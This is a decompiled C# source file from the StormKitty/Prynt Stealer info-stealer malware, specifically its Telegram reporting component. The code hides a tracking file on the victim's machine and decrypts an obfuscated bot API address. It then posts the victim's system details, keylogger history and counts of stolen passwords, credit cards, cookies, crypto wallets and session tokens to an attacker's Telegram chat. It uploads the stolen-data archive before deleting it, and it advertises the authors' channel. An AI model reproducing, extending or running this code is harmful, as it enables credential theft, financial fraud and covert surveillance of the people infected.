using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using Stealer;
using StormKitty.Implant;

namespace StormKitty.Telegram
{
	// Token: 0x02000053 RID: 83
	internal sealed class Report
	{
		// Token: 0x0600016C RID: 364 RVA: 0x0000C8CE File Offset: 0x0000AACE
		public static void SetLatestMessageId(int id)
		{
			File.WriteAllText(Report.LatestMessageIdLocation, id.ToString());
			Startup.SetFileCreationDate(Report.LatestMessageIdLocation);
			Startup.HideFile(Report.LatestMessageIdLocation);
		}

		// Token: 0x0600016D RID: 365 RVA: 0x0000C8F5 File Offset: 0x0000AAF5
		public static int GetLatestMessageId()
		{
			if (File.Exists(Report.LatestMessageIdLocation))
			{
				return int.Parse(File.ReadAllText(Report.LatestMessageIdLocation));
			}
			return -1;
		}

		// Token: 0x0600016E RID: 366 RVA: 0x0000C914 File Offset: 0x0000AB14
		private static int GetMessageId(string response)
		{
			return int.Parse(Regex.Match(response, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));
		}

		// Token: 0x0600016F RID: 367 RVA: 0x0000C93C File Offset: 0x0000AB3C
		public static bool TokenIsValid()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					return webClient.DownloadString(Report.TelegramBotAPI + Config.TelegramAPI + "/getMe").StartsWith("{\"ok\":true,");
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000170 RID: 368 RVA: 0x0000C9A4 File Offset: 0x0000ABA4
		public static int SendMessage(string text)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					return Report.GetMessageId(webClient.DownloadString(string.Concat(new string[]
					{
						Report.TelegramBotAPI,
						Config.TelegramAPI,
						"/sendMessage?chat_id=",
						Config.TelegramID,
						"&text=",
						text,
						"&parse_mode=Markdown&disable_web_page_preview=True"
					})));
				}
			}
			catch
			{
			}
			return 0;
		}

		// Token: 0x06000171 RID: 369 RVA: 0x0000CA30 File Offset: 0x0000AC30
		public static void sendFile(string file, string type = "Document")
		{
			if (!File.Exists(file))
			{
				Report.SendMessage("⛔ File not found!");
				return;
			}
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), type.ToLower(), file);
				httpClient.PostAsync(string.Concat(new string[]
				{
					"https://api.telegram.org/bot",
					Config.TelegramAPI,
					"/send",
					type,
					"?chat_id=",
					Config.TelegramID
				}), multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x06000172 RID: 370 RVA: 0x0000CAE0 File Offset: 0x0000ACE0
		public static void EditMessage(string text, int id)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadString(string.Concat(new string[]
					{
						Report.TelegramBotAPI,
						Config.TelegramAPI,
						"/editMessageText?chat_id=",
						Config.TelegramID,
						"&text=",
						text,
						"&message_id=",
						id.ToString(),
						"&parse_mode=Markdown&disable_web_page_preview=True"
					}));
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000173 RID: 371 RVA: 0x0000CB7C File Offset: 0x0000AD7C
		private static string GetKeylogsHistory()
		{
			if (!File.Exists(Report.KeylogsHistory))
			{
				return "";
			}
			List<string> list = File.ReadAllLines(Report.KeylogsHistory).Reverse<string>().Take(10).Reverse<string>().ToList<string>();
			string str = (list.Count == 10) ? string.Format("({0} - MAX)", list.Count) : string.Format("({0})", list.Count);
			string str2 = string.Join("\n", list);
			return "\n\n  ⌨️ *Keylogger " + str + ":*\n" + str2;
		}

		// Token: 0x06000174 RID: 372 RVA: 0x0000CC10 File Offset: 0x0000AE10
		private static void SendSystemInfo()
		{
			string text = string.Concat(new string[]
			{
				"\n  \ud83d\udc63 ~Prynt Stealer Results~ :\nDate: ",
				SystemInfo.datenow,
				"\nSystem: ",
				SystemInfo.GetSystemVersion(),
				"\nUsername: ",
				SystemInfo.username,
				"\nCompName: ",
				SystemInfo.compname,
				"\nLanguage: ",
				Flags.GetFlag(SystemInfo.culture.Split(new char[]
				{
					'-'
				})[1]),
				" ",
				SystemInfo.culture,
				"\nAntivirus: ",
				SystemInfo.GetAntivirus(),
				"\n\n  \ud83d\udc63 *Computer Info:*\nCPU: ",
				SystemInfo.GetCPUName(),
				"\nGPU: ",
				SystemInfo.GetGPUName(),
				"\nRAM: ",
				SystemInfo.GetRamAmount(),
				"\nHWID: ",
				SystemInfo.GetHardwareID(),
				"\nPower: ",
				SystemInfo.GetBattery(),
				"\nScreen: ",
				SystemInfo.ScreenMetrics(),
				"\n\n  \ud83d\udc63 *IP INFO:* \nGateway IP: ",
				SystemInfo.GetDefaultGateway(),
				"\nInternal IP: ",
				SystemInfo.GetLocalIP(),
				"\nExternal IP: ",
				SystemInfo.GetPublicIP(),
				"\n",
				SystemInfo.GetLocation(),
				"\n\n  \ud83d\udc63 *Domain Detects:*",
				Counter.GetLValue("\ud83c\udfe6 *Banking services*", Counter.DetectedBankingServices, '-'),
				Counter.GetLValue("\ud83d\udcb0 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-'),
				Report.GetKeylogsHistory(),
				"\n\n  \ud83d\udc63 *Stealer Info:*",
				Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords),
				Counter.GetIValue("\ud83d\udcb3 CreditCards", Counter.CreditCards),
				Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies),
				Counter.GetIValue("\ud83d\udcc2 AutoFill", Counter.AutoFill),
				Counter.GetIValue("⏳ History", Counter.History),
				Counter.GetIValue("\ud83d\udd16 Bookmarks", Counter.Bookmarks),
				Counter.GetIValue("\ud83d\udce6 Downloads", Counter.Downloads),
				"\n\n  \ud83d\udc63 *Wallets And Accounts:*",
				Counter.GetIValue("\ud83d\udcb0 Wallets", Counter.Wallets),
				Counter.GetIValue("\ud83d\udce1 FTP hosts", Counter.FTPHosts),
				Counter.GetIValue("\ud83d\udd0c VPN accounts", Counter.VPN),
				Counter.GetIValue("\ud83e\udda2 Pidgin accounts", Counter.Pidgin),
				Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram),
				Counter.GetSValue("\ud83d\udcac Discord token", Counter.Discord),
				Counter.GetSValue("\ud83c\udfae Steam session", Counter.Steam),
				Counter.GetSValue("\ud83c\udfae Uplay session", Counter.Uplay),
				"\n\n  \ud83d\udc63 *System Info:*",
				Counter.GetSValue("\ud83d\udddd Windows product key", Counter.ProductKey),
				Counter.GetIValue("\ud83d\udef0 Wifi networks", Counter.SavedWifiNetworks),
				Counter.GetSValue("\ud83d\udcf8 Webcam screenshot", Counter.WebcamScreenshot),
				Counter.GetSValue("\ud83c\udf03 Desktop screenshot", Counter.DesktopScreenshot),
				"\n\n \ud83d\udc63 *Clipper/Keylogger Info:*",
				Counter.GetBValue(Config.Autorun == "1", "✅ Startup installed", "⛔️ Startup disabled"),
				Counter.GetBValue(Config.ClipperModule == "1" && Config.Autorun == "1", "✅ Clipper installed", "⛔️ Clipper not installed"),
				Counter.GetBValue(Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1", "✅ Keylogger installed", "⛔️ Keylogger not installed"),
				"\n\n  \ud83d\udc63 *File Info:*",
				Counter.GetIValue("\ud83d\udcc2 Source code files", Counter.GrabberSourceCodes),
				Counter.GetIValue("\ud83d\udcc2 Database files", Counter.GrabberDatabases),
				Counter.GetIValue("\ud83d\udcc2 Documents", Counter.GrabberDocuments),
				Counter.GetIValue("\ud83d\udcc2 Images", Counter.GrabberImages),
				"\n\n  \ud83d\udc63 Coded And Developed By @FlatLineStealerOffical And @youhacker55\n  \ud83d\udc63 Join The Official Channel @officialpryntsoftware\n\n\n\ud83d\udc63 *Password For Logs*: \"_",
				Config.password,
				"\"_"
			});
			Report.GetLatestMessageId();
			Report.SendMessage(text);
		}

		// Token: 0x06000175 RID: 373 RVA: 0x0000D043 File Offset: 0x0000B243
		public static void SendReport(string file)
		{
			Report.SendSystemInfo();
			Report.sendFile(file, "Document");
			File.Delete(file);
		}

		// Token: 0x04000099 RID: 153
		private const int MaxKeylogs = 10;

		// Token: 0x0400009A RID: 154
		private static string TelegramBotAPI = StringsCrypt.Decrypt(new byte[]
		{
			239,
			217,
			27,
			234,
			106,
			21,
			204,
			49,
			53,
			43,
			140,
			84,
			157,
			206,
			231,
			110,
			180,
			238,
			101,
			7,
			217,
			169,
			12,
			49,
			56,
			145,
			75,
			213,
			195,
			135,
			141,
			221
		});

		// Token: 0x0400009B RID: 155
		private static string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

		// Token: 0x0400009C RID: 156
		private static string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");
	}
}
